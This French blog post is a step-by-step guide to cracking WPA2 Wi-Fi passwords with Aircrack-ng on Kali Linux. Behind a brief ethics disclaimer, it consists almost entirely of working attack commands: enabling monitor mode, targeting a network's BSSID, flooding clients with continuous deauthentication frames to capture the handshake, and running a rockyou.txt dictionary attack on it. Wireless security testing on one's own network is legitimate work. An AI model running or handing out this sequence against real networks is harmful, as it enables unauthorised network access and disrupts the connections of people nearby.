---
title: Aircrack-NG Crack WIFI WPA2 Password
time: 2024-12-19 12:00:00
categories: [Hacking]
tags: [kali,wifi,hack,cybersecurity]
image: /assets/posts/WiFi/aircrack.jpg
---

## 🚨 Préambule Éthique

> **ATTENTION :** Ce guide est strictement à des fins éducatives et professionnelles.


## 🚀 Aircrack-NG 


-------------------

## 🎯 Préréquis
>  Un ordinateur portable

>  Système Kali linux 

>  Adaptateur Wifi qui supporte le mode monitor 

>  Votre propre point d'acès WIFI que vous avez le droit de pirater 

-------------------


## 🛠️ Préparation de l'environnement


#### Le lien pour télécharger la machine virtuelle Kali linux.

> [Kali Virtual Machine](https://www.kali.org/get-kali/#kali-virtual-machines)


## 🎮 WORKFLOW COMPLET

### 1️⃣ Activation du Mode Monitor
```bash
# Nettoyage Initial
sudo airmon-ng check kill

# Activation du Mode Guerrier
sudo airmon-ng start wlan0
```

### 2️⃣ Reconnaissance du Terrain
```bash
# Scan des Environs
sudo airodump-ng wlan0mon
```

### 3️⃣ Ciblage Précis
```bash
# 🎯 Focus sur la Cible
sudo airodump-ng -c [CANAL] --bssid [MAC] -w capture wlan0mon
```

### 4️⃣ Capture Stratégique
```bash
# ⚡ Déauthentification Tactique
sudo aireplay-ng --deauth 0 -a [MAC] wlan0mon
```

### 5️⃣ Analyse Finale
```bash
# 🔓 Tentative de Déchiffrement
sudo aircrack-ng -w rockyou.txt capture-01.cap
```

-------------------

